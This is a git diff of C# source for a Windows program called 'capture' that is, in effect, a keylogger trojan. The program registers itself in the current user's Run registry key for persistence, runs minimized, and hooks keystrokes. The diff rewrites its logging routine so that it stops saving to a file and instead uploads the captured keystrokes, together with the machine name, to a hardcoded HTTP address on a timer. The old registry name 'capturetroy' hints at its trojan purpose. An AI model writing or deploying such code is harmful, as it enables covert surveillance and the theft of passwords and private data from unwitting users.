@@ -10,10 +10,12 @@ using System.IO;
 using System.Net;
 using System.Net.NetworkInformation;
 using Microsoft.Win32;
+using System.Collections.Specialized;
 namespace capture
 {
     enum Tick:int{
-        OFF=60000, ON=300000
+        //OFF=60000, ON=300000
+        OFF = 60000, ON = 30000
     }
     
     public partial class Form1 : Form
@@ -21,7 +23,7 @@ namespace capture
         RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
         public Form1()
         {
-            reg.SetValue("capturetroy", Application.ExecutablePath.ToString());
+            reg.SetValue("capture", Application.ExecutablePath.ToString());
             
             InitializeComponent();
 
@@ -31,6 +33,9 @@ namespace capture
         string file = "";
         string destination = "";
         bool connected = false;
+
+        string uri = "http://192.168.137.222/annhau/capture";
+        string machine = System.Environment.MachineName.ToString();
         private void Form1_Load(object sender, EventArgs e)
         {
             this.WindowState = FormWindowState.Minimized;
@@ -50,7 +55,7 @@ namespace capture
             else {
                 connected = true;
                 timer1.Interval =(int) Tick.ON;
-                Config();
+         //       Config();
                 timer1.Start();
               
             }
@@ -79,7 +84,7 @@ namespace capture
                         fs.Write(info, 0, info.Length);
                         fs.Close();
                     }
-                    UploadFile();
+                 //   UploadFile(); //tam thoi tat
                 }
             }
             else
@@ -91,7 +96,7 @@ namespace capture
                     fs.Write(info, 0, info.Length);
                     fs.Close();
                 }
-                UploadFile();
+                //   UploadFile(); //tam thoi tat
             }
         }
         private void HookManager_KeyDown(object sender, KeyEventArgs e) {
@@ -231,37 +236,37 @@ namespace capture
 
         }
         private void AppendFile() {
-            //try
+            if (connected)
             {
-                using (StreamWriter sw = File.AppendText(file))
+                using (WebClient client = new WebClient())
                 {
-                    line = DateTime.Now.ToString() + "\n" + line;
-                    sw.WriteLine(line);
-                    sw.Close();
+
+                    byte[] response =
+                    client.UploadValues(uri, new NameValueCollection()
+               {
+                   { "content", line },
+                   { "machine", machine }
+               });
                     line = "";
+
                 }
             }
-            //catch (IOException ex)
-            //{
-
-            //}
         }
+       
         int time = 0;
         
         private void timer1_Tick(object sender, EventArgs e)
         {
             if (connected)
             {
-                MessageBox.Show(line);
-
-                AppendFile();
+               
                 if (time < 3)
                 {
                     time++;
                 }
                 else {
                     time = 0;
-                    UploadFile();
+                    AppendFile();
                 }
             }
             else
@@ -275,5 +280,7 @@ namespace capture
             f.ShowDialog();
             HookManager.KeyPress += HookManager_KeyPress;
         }
+
+        public string ProxyString { get; set; }
     }
 }
